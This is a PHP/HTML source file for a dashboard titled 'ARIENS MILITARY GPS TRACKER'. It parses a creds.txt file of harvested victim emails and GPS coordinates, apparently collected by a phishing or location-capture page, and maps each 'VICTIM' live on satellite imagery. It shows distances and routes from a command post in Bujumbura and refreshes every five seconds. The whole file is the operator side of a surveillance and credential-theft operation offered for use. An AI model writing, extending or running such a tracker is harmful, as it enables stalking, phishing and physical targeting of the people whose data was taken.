<?php
// ========================================
// TA LOGIQUE BACKEND 100% ORIGINALE
// ========================================
$credsFile = 'creds.txt';
$victims = [];
$opLat = -3.361378;
$opLng = 29.359912;

if (file_exists($credsFile)) {
    $content = file_get_contents($credsFile);
    // TES REGEX EXACTES
    preg_match_all('/📍 GPS POSITION : ([-]?\d+\.?\d*), ([-]?\d+\.?\d*)/', $content, $gpsMatches, PREG_SET_ORDER);
    preg_match_all('/📧 Email : ([^\r\n]+)/', $content, $emailMatches, PREG_SET_ORDER);
    
    $gpsCount = count($gpsMatches);
    $emailCount = count($emailMatches);
    
    for ($i = 0; $i < min($gpsCount, $emailCount); $i++) {
        $victims[] = [
            'lat' => floatval($gpsMatches[$i][1]),
            'lng' => floatval($gpsMatches[$i][2]),
            'email' => trim($emailMatches[$i][1]),
            'id' => $i + 1
        ];
    }
}

// Haversine (ajouté seulement pour distances)
function haversineDistance($lat1, $lng1, $lat2, $lng2) {
    $earthRadius = 6371;
    $dLat = deg2rad($lat2 - $lat1);
    $dLng = deg2rad($lng2 - $lng1);
    $a = sin($dLat/2) * sin($dLat/2) + cos(deg2rad($lat1)) * cos(deg2rad($lat2)) * sin($dLng/2) * sin($dLng/2);
    $c = 2 * atan2(sqrt($a), sqrt(1-$a));
    return $earthRadius * $c;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>ARIENS MILITARY GPS TRACKER</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.css"/>
    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.Default.css"/>
    <style>
        /* TON STYLE MILITAIRE */
        body { margin:0; font-family:'Courier New',monospace; background:#000; color:#0f0; }
        #map { height:100vh; border:2px solid #0f0; }
        .header {
            background:rgba(0,0,0,0.9); padding:20px; border-bottom:3px solid #0f0;
            font-size:24px; text-align:center; text-shadow:0 0 10px #0f0;
            box-shadow:0 0 30px #0f0;
        }
    </style>
</head>
<body>
    <div class="header">ARIENS MILITARY GPS TRACKER - LIVE TRACKING | VICTIMS: <?php echo count($victims); ?></div>
    <div id="map"></div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script src="https://unpkg.com/leaflet.markercluster@1.4.1/dist/leaflet.markercluster.js"></script>
    
    <script>
        var map = L.map('map').setView([<?php echo $opLat; ?>, <?php echo $opLng; ?>], 10);
        
        // Satellite militaire HD
        L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}').addTo(map);
        
        var markers = L.markerClusterGroup();
        
        // OP (jaune)
        var opIcon = L.divIcon({className:'op-marker', html:'<div style="background:#ff0;color:#000;font-weight:bold;border-radius:50%;width:30px;height:30px;line-height:30px;text-align:center;box-shadow:0 0 15px #ff0">OP</div>'});
        L.marker([<?php echo $opLat; ?>, <?php echo $opLng; ?>], {icon:opIcon})
            .bindPopup('<b>🟡 COMMAND POST</b><br>Bujumbura OP')
            .addTo(markers);
        
        <?php foreach($victims as $victim): 
            $dist = haversineDistance($opLat, $opLng, $victim['lat'], $victim['lng']);
        ?>
            // Victime #<?php echo $victim['id']; ?>
            var vIcon<?php echo $victim['id']; ?> = L.divIcon({
                className:'pulse',
                html:'<div style="background:#f44;color:#fff;border-radius:50%;width:25px;height:25px;line-height:25px;font-weight:bold;text-align:center;box-shadow:0 0 20px #f44">#<?php echo $victim['id']; ?></div>'
            });
            
            L.marker([<?php echo $victim['lat']; ?>, <?php echo $victim['lng']; ?>], {icon: vIcon<?php echo $victim['id']; ?>})
                .bindPopup('<b>🔴 VICTIM #<?php echo $victim['id']; ?></b><br>📧 <?php echo htmlspecialchars($victim['email']); ?><br>📏 <b><?php echo round($dist,2); ?> KM</b> from OP')
                .addTo(markers);
                
            // Route OP→Victime
            L.polyline([
                [<?php echo $opLat; ?>, <?php echo $opLng; ?>],
                [<?php echo $victim['lat']; ?>, <?php echo $victim['lng']; ?>]
            ], {color:'#f44', weight:3, dashArray:'10 5'}).addTo(map);
        <?php endforeach; ?>
        
        map.addLayer(markers);
        map.fitBounds(markers.getBounds());
        
        // Refresh 5s
        setInterval(() => location.reload(), 5000);
        
        // Pulse CSS
        const style = document.createElement('style');
        style.textContent = `
            .pulse { animation: pulse 2s infinite; }
            @keyframes pulse {
                0% { box-shadow: 0 0 0 0 rgba(244,68,68,0.7); }
                70% { box-shadow: 0 0 0 20px rgba(244,68,68,0); }
                100% { box-shadow: 0 0 0 0 rgba(244,68,68,0); }
            }
        `;
        document.head.appendChild(style);
    </script>
</body>
</html>
